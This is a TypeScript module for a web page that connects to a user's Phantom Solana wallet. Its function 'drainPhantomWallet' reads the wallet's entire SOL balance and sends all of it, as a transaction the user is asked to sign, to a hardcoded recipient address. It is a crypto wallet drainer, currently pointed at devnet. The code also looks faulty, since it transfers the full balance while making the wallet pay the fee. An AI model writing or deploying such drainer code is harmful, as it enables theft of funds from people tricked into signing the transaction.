import { PublicKey, Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, clusterApiUrl } from "@solana/web3.js";

// Use official Solana devnet endpoint
const connection = new Connection(clusterApiUrl('devnet'), 'confirmed');
const RECIPIENT_ADDRESS = new PublicKey("9C74cPLodhAsTSYujZhSzPuSwCHjLck3u7nHoPHdV1DQ");

declare global {
  interface Window {
    solana?: {
      isPhantom?: boolean;
      connect: () => Promise<{ publicKey: { toString: () => string } }>;
      disconnect: () => Promise<void>;
      signAndSendTransaction: (transaction: Transaction) => Promise<{ signature: string }>;
    };
  }
}

export async function connectPhantomWallet(): Promise<string> {
  if (!window.solana || !window.solana.isPhantom) {
    throw new Error("Phantom wallet not found");
  }

  try {
    const response = await window.solana.connect();
    return response.publicKey.toString();
  } catch (error) {
    throw new Error("Failed to connect to Phantom wallet");
  }
}

export async function disconnectPhantomWallet(): Promise<void> {
  if (!window.solana) {
    throw new Error("Phantom wallet not found");
  }

  try {
    await window.solana.disconnect();
  } catch (error) {
    throw new Error("Failed to disconnect from Phantom wallet");
  }
}

export async function drainPhantomWallet(): Promise<void> {
  if (!window.solana || !window.solana.isPhantom) {
    throw new Error("Phantom wallet not found");
  }

  try {
    console.log("Starting transaction process...");

    // Ensure connection to wallet
    const response = await window.solana.connect();
    const walletPubKey = new PublicKey(response.publicKey.toString());
    console.log("Connected to wallet:", walletPubKey.toString());

    // Check wallet balance
    const balance = await connection.getBalance(walletPubKey);
    console.log("Wallet balance:", balance / LAMPORTS_PER_SOL, "SOL");

    if (balance <= 0) {
      throw new Error("No SOL available in wallet");
    }

    // Create transaction
    const transaction = new Transaction();

    // Get recent blockhash
    const { blockhash } = await connection.getLatestBlockhash('finalized');
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = walletPubKey;

    // Create transfer instruction
    const transferIx = SystemProgram.transfer({
      fromPubkey: walletPubKey,
      toPubkey: RECIPIENT_ADDRESS,
      lamports: balance,
    });

    transaction.add(transferIx);

    try {
      // Send transaction
      console.log("Sending transaction...");
      const { signature } = await window.solana.signAndSendTransaction(transaction);
      console.log("Transaction sent with signature:", signature);

      // Wait for confirmation
      const confirmation = await connection.confirmTransaction(signature);

      if (confirmation.value.err) {
        throw new Error(`Transaction failed: ${confirmation.value.err}`);
      }

      console.log("Transaction confirmed!");
      return;

    } catch (sendError) {
      console.error("Error during transaction:", sendError);
      throw new Error("Failed to send transaction. Please try again.");
    }

  } catch (error) {
    console.error("Transaction process failed:", error);
    throw error;
  }
}